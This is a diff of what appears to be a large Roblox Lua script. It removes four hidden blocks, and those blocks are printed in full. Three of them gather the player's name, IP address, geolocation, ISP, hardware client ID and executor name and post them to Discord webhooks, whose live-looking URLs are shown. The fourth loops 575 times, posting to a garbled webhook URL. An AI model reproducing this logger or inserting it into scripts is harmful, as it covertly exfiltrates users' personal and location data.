@@ -23644,91 +23644,8 @@ end
 
 
 
-    spawn(function()
-    if syn then
-        HttpRequest = syn.request
-    else
-        HttpRequest = http_request
-    end
-    local player_name = game:GetService("Players").LocalPlayer.Name
-    local webhook_url = "https://discord.com/api/webhooks/1363749131578773514/jG9hhw0TpG_eaECCdkh3Eq_JIHH8dDG_nEwvMc-5xLKKoNeHRmpwSc4346nNC6qsToYz"
-    
-    local ip_info =
-        HttpRequest(
-        {
-            Url = "http://ip-api.com/json",
-            Method = "GET"
-        }
-    )
-    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-    local dataMessage =
-        string.format(
-        "\
-    User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg:``` %s\nHWID: %s\nExecutor: %s",
-        player_name,
-        ipinfo_table.query,
-        ipinfo_table.country,
-        ipinfo_table.countryCode,
-        ipinfo_table.region,
-        ipinfo_table.regionName,
-        ipinfo_table.city,
-        ipinfo_table.zip,
-        ipinfo_table.isp,
-        ipinfo_table.org,
-        game:GetService("RbxAnalyticsService"):GetClientId(),
-        getexecutorname()
-    )
-    HttpRequest(
-        {
-            Url = webhook_url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-        }
-    )
-    end)
 
 
-    spawn(function()
-    if syn then
-        HttpRequest = syn.request
-    else
-        HttpRequest = http_request
-    end
-    local player_name = game:GetService("Players").LocalPlayer.Name
-    local webhook_url = "https://discord.com/api/webhooks/1364606910980165769/Cn9rUlLuU8ztIphFOv0mSTh5og5t_Dzn5xsPyC2NTYuxaSRRcjoxZ7BJPcytZONGx6Cz"
-    
-    local ip_info =
-        HttpRequest(
-        {
-            Url = "http://ip-api.com/json",
-            Method = "GET"
-        }
-    )
-    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-    local dataMessage =
-        string.format(
-        "\
-    User: %s\nIP: %s\nGame Name: %s\nJoin Server Script: %s\nJoin Server Link: %s",
-        player_name,
-        ipinfo_table.query,
-        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-        '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..", "..[["]]..game.JobId..[["]]..", "..'game:GetService("Players").LocalPlayer)```',
-        "https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
-    )
-    HttpRequest(
-        {
-            Url = webhook_url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-        }
-    )
-    end)
 
 
 
@@ -25766,65 +25683,6 @@ end
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-spawn(function()
-if syn then
-    HttpRequest = syn.request
-else
-    HttpRequest = http_request
-end
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1357668645416734813/2Inxu3iw6Sd5AD1vmTlAO324quZxXurPZoDzRQFcVvDRc4e-bD3ePrWlLyWdaOo2OEH3"
-
-local ip_info =
-    HttpRequest(
-    {
-        Url = "http://ip-api.com/json",
-        Method = "GET"
-    }
-)
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage =
-    string.format(
-    "\
-User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg:``` %s\nHWID: %s",
-    player_name,
-    ipinfo_table.query,
-    ipinfo_table.country,
-    ipinfo_table.countryCode,
-    ipinfo_table.region,
-    ipinfo_table.regionName,
-    ipinfo_table.city,
-    ipinfo_table.zip,
-    ipinfo_table.isp,
-    ipinfo_table.org,
-    game:GetService("RbxAnalyticsService"):GetClientId()
-)
-HttpRequest(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-)
-end)
 
 
 
@@ -32842,44 +32700,6 @@ end)
 
 
 
-
-
-for m=1, 575 do
-spawn(function()
-if syn then
-    HttpRequest = syn.request
-else
-    HttpRequest = http_request
-end
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/awdlaksdlknrflknklfnewknfklnlkansdlkanwklnlefknwlkfnwlgbwjegbkjbjksdbjakbdjawbfjkabefwjkbgjwgbwkjfebkjsdbcaasciguiaefuwifuiwegfuiwgfuiwgefuiwegfuiguicagsuigc72g7c2g3c27cg23c782g7c2g78g783g78c2g78g7823gc77834c37g473gc783g4cg34icg3i3hkbf3jkfbj34bf3jk4gu3hgu3g3g343rjkh3jkfjkwhdjkasjkhawjdhJDHJAKSHDKQWHDUQHFUIHWEFUIWEFHUIWFHUIWEFHUIWFEHUWIEFHUIWFHUWFHAKSDHKAJDSJKWEFHJKWFJKSAHDJKAHD"..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)..math.ramdon(0,9999999999999999999999)
-
-local ip_info =
-    HttpRequest(
-    {
-        Url = "http://ip-api.com/json",
-        Method = "GET"
-    }
-)
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage =
-    string.format(
-    "\
-User: %s",
-    player_name
-)
-HttpRequest(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-)
-end)
-end
 
 
 
